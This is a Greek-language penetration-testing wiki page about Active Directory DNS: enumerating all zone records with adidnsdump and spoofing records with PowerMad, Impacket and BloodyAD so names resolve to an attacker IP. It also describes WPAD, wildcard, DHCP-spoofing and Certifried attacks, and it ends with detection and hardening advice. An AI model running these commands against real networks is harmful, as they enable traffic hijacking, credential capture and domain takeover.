# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Από προεπιλογή, **οποιοσδήποτε χρήστης** στο Active Directory μπορεί να **καταγράψει όλα τα DNS records** στις ζώνες DNS του Domain ή του Forest, παρόμοια με μια μεταφορά ζώνης (οι χρήστες μπορούν να καταγράψουν τα παιδικά αντικείμενα μιας ζώνης DNS σε ένα περιβάλλον AD).

Το εργαλείο [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) επιτρέπει την **καταγραφή** και **εξαγωγή** **όλων των DNS records** στη ζώνη για σκοπούς αναγνώρισης εσωτερικών δικτύων.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (Απρίλιος 2025) προσθέτει JSON/Greppable (`--json`) έξοδο, πολυνηματική επίλυση DNS και υποστήριξη για TLS 1.2/1.3 κατά την σύνδεση σε LDAPS

Για περισσότερες πληροφορίες διαβάστε [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Δημιουργία / Τροποποίηση εγγραφών (ADIDNS spoofing)

Επειδή η ομάδα **Authenticated Users** έχει **Create Child** στο DACL της ζώνης από προεπιλογή, οποιοσδήποτε λογαριασμός τομέα (ή λογαριασμός υπολογιστή) μπορεί να καταχωρήσει επιπλέον εγγραφές. Αυτό μπορεί να χρησιμοποιηθεί για hijacking κυκλοφορίας, NTLM relay coercion ή ακόμη και πλήρη συμβιβασμό τομέα.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py αποστέλλεται με το Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Κοινές επιθέσεις

1. **Wildcard record** – `*.<zone>` μετατρέπει τον AD DNS server σε έναν πανεπιχειρησιακό απαντητή παρόμοιο με την παραποίηση LLMNR/NBNS. Μπορεί να χρησιμοποιηθεί για την καταγραφή NTLM hashes ή για την αναμετάδοση τους σε LDAP/SMB.  (Απαιτεί να είναι απενεργοποιημένο το WINS-lookup.)
2. **WPAD hijack** – προσθέστε `wpad` (ή μια **NS** εγγραφή που δείχνει σε έναν επιτιθέμενο για να παρακάμψει τη Λίστα Παγκόσμιας Ερώτησης-Φραγής) και διαφανώς προξενήστε εξερχόμενα HTTP αιτήματα για να συλλέξετε διαπιστευτήρια.  Η Microsoft διόρθωσε τις παρακάμψεις wildcard/ DNAME (CVE-2018-8320) αλλά οι **NS-εγγραφές εξακολουθούν να λειτουργούν**.
3. **Stale entry takeover** – διεκδικήστε τη διεύθυνση IP που ανήκε προηγουμένως σε έναν υπολογιστή και η σχετική DNS εγγραφή θα συνεχίσει να επιλύεται, επιτρέποντας επιθέσεις περιορισμένης εξουσιοδότησης ή Shadow-Credentials χωρίς να αγγίξετε καθόλου το DNS.
4. **DHCP → DNS spoofing** – σε μια προεπιλεγμένη εγκατάσταση Windows DHCP+DNS, ένας μη αυθεντικοποιημένος επιτιθέμενος στο ίδιο υποδίκτυο μπορεί να αντικαταστήσει οποιαδήποτε υπάρχουσα A εγγραφή (συμπεριλαμβανομένων των Domain Controllers) στέλνοντας πλαστές DHCP αιτήσεις που ενεργοποιούν δυναμικές ενημερώσεις DNS (Akamai “DDSpoof”, 2023).  Αυτό δίνει μηχανή-στη-μέση πάνω από Kerberos/LDAP και μπορεί να οδηγήσει σε πλήρη κατάληψη τομέα.
5. **Certifried (CVE-2022-26923)** – αλλάξτε το `dNSHostName` ενός λογαριασμού μηχανής που ελέγχετε, καταχωρίστε μια αντίστοιχη A εγγραφή, στη συνέχεια ζητήστε ένα πιστοποιητικό για αυτό το όνομα για να προσποιηθείτε τον DC. Εργαλεία όπως το **Certipy** ή το **BloodyAD** αυτοματοποιούν πλήρως τη διαδικασία.

---

## Ανίχνευση & σκληραγώγηση

* Αρνηθείτε στους **Authenticated Users** το δικαίωμα *Create all child objects* σε ευαίσθητες ζώνες και αναθέστε δυναμικές ενημερώσεις σε έναν ειδικό λογαριασμό που χρησιμοποιείται από το DHCP.
* Εάν απαιτούνται δυναμικές ενημερώσεις, ρυθμίστε τη ζώνη σε **Secure-only** και ενεργοποιήστε την **Name Protection** στο DHCP ώστε μόνο το αντικείμενο υπολογιστή του ιδιοκτήτη να μπορεί να αντικαταστήσει τη δική του εγγραφή.
* Παρακολουθήστε τα IDs γεγονότων του DNS Server 257/252 (δυναμική ενημέρωση), 770 (μεταφορά ζώνης) και τις εγγραφές LDAP στο `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Εμποδίστε επικίνδυνα ονόματα (`wpad`, `isatap`, `*`) με μια σκόπιμα καλοήθη εγγραφή ή μέσω της Παγκόσμιας Λίστας Φραγής Ερωτήσεων.
* Διατηρήστε τους DNS servers ενημερωμένους – π.χ., τα σφάλματα RCE CVE-2024-26224 και CVE-2024-26231 έφτασαν **CVSS 9.8** και είναι εκμεταλλεύσιμα απομακρυσμένα κατά των Domain Controllers.

## Αναφορές

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, εξακολουθεί να είναι η de-facto αναφορά για επιθέσεις wildcard/WPAD)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Δεκ 2023)
{{#include ../../banners/hacktricks-training.md}}
